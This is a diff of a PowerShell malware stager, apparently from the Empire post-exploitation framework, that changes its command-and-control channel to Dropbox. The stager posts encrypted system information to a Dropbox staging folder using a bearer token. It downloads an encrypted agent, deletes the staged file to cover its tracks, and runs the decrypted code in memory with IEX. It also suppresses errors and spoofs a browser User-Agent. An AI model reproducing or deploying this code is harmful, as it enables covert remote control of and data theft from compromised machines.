@@ -1,23 +1,23 @@
 function Start-Negotiate {
-    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
-    
+    param($T,$SK,$PI=5,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
+
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
         begin {
-            [Byte[]] $Str = 0..255;
+            [Byte[]] $S = 0..255;
             $J = 0;
             0..255 | ForEach-Object {
-                $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;
-                $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
+                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
+                $S[$_], $S[$J] = $S[$J], $S[$_];
             };
             $I = $J = 0;
         }
         process {
             ForEach($Byte in $In) {
                 $I = ($I + 1) % 256;
-                $J = ($J + $Str[$I]) % 256;
-                $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
-                $Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];
+                $J = ($J + $S[$I]) % 256;
+                $S[$I], $S[$J] = $S[$J], $S[$I];
+                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
             }
         }
     }
@@ -38,12 +38,7 @@ function Start-Negotiate {
 
             # extract the IV
             $IV = $In[0..15];
-           try {
-                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
-            }
-            catch {
-                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
-            }
+            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
             $AES.Mode = "CBC";
             $AES.Key = $e.GetBytes($Key);
             $AES.IV = $IV;
@@ -58,17 +53,11 @@ function Start-Negotiate {
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
     $e=[System.Text.Encoding]::ASCII;
-    $customHeaders = "";
+
     $SKB=$e.GetBytes($SK);
     # set up the AES/HMAC crypto
     # $SK -> staging key for this server
-    try {
-        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
-    }
-    catch {
-        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
-    }
-    
+    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     $IV = [byte] 0..255 | Get-Random -count 16;
     $AES.Mode="CBC";
     $AES.Key=$SKB;
@@ -101,17 +90,7 @@ function Start-Negotiate {
         $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
     }
-    # the User-Agent always resets for multiple calls...silly
-    if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
-        $headers | ForEach-Object {
-            $headerKey = $_.split(':')[0];
-            $headerValue = $_.split(':')[1];
-            $wc.Headers.Add($headerKey, $headerValue);
-        }
-    }
-    $wc.Headers.Add("User-Agent",$UA);
-    
+
     # RC4 routing packet:
     #   sessionID = $ID
     #   language = POWERSHELL (1)
@@ -123,12 +102,23 @@ function Start-Negotiate {
     $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
     $rc4p = $IV + $rc4p + $eb;
 
+    # the User-Agent always resets for multiple calls...silly
+    $wc.Headers.Set("User-Agent",$UA);
+    # add Dropbox specific args
+    $wc.Headers.Set("Authorization", "Bearer $T");
+    $wc.Headers.Set("Content-Type", "application/octet-stream");
+    # have to remove before adding a new value
+    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_1.txt`"}");
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
-    $raw=$wc.UploadData($s+"/index.jsp","POST",$rc4p);
+    $Null = $wc.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $rc4p);
 
     # step 4 of negotiation -> server returns RSA(nonce+AESsession))
+    Start-Sleep -Seconds $(($PI -as [Int])*2);
+    $wc.Headers.Set("User-Agent",$UA);
+    $wc.Headers.Set("Authorization", "Bearer $T");
+    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_2.txt`"}");
+    $raw=$wc.DownloadData("https://content.dropboxapi.com/2/files/download");
     $de=$e.GetString($rs.decrypt($raw,$false));
-
     # packet = server nonce + AES session key
     $nonce=$de[0..15] -join '';
     $key=$de[16..$de.length] -join '';
@@ -137,12 +127,7 @@ function Start-Negotiate {
     $nonce=[String]([long]$nonce + 1);
 
     # create a new AES object
-    try {
-        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
-    }
-    catch {
-        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
-    }
+    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     $IV = [byte] 0..255 | Get-Random -Count 16;
     $AES.Mode="CBC";
     $AES.Key=$e.GetBytes($key);
@@ -187,22 +172,31 @@ function Start-Negotiate {
     $rc4p2 = $IV2 + $rc4p2 + $eb2;
 
     # the User-Agent always resets for multiple calls...silly
-    if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
-        $headers | ForEach-Object {
-            $headerKey = $_.split(':')[0];
-            $headerValue = $_.split(':')[1];
-            $wc.Headers.Add($headerKey, $headerValue);
-        }
-    }
-    $wc.Headers.Add("User-Agent",$UA);
+    Start-Sleep -Seconds $(($PI -as [Int])*2);
+    $wc.Headers.Set("User-Agent",$UA);
+    $wc.Headers.Set("Authorization", "Bearer $T");
+    $wc.Headers.Set("Content-Type", "application/octet-stream");
+    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_3.txt`"}");
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
-    $raw=$wc.UploadData($s+"/index.php","POST",$rc4p2);
+    $Null = $wc.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $rc4p2);
 
-    # # decrypt the agent and register the agent logic
-    # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
-    # write-host "data len: $($Data.Length)";
+    Start-Sleep -Seconds $(($PI -as [Int])*2);
+    $wc.Headers.Set("User-Agent",$UA);
+    $wc.Headers.Set("Authorization", "Bearer $T");
+    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_4.txt`"}");
+    $raw=$wc.DownloadData("https://content.dropboxapi.com/2/files/download");
+
+    Start-Sleep -Seconds $($PI -as [Int]);
+    $wc2=New-Object System.Net.WebClient;
+    $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+    $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+    $wc2.Headers.Add("User-Agent",$UA);
+    $wc2.Headers.Add("Authorization", "Bearer $T");
+    $wc2.Headers.Add("Content-Type", " application/json");
+    $Null=$wc2.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_4.txt`"}");
+
+    # decrypt the agent and register the agent logic
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
@@ -210,7 +204,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID;
+    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
+Start-Negotiate -T $T -PI "REPLACE_POLLING_INTERVAL" -SK "REPLACE_STAGING_KEY" -UA $u;
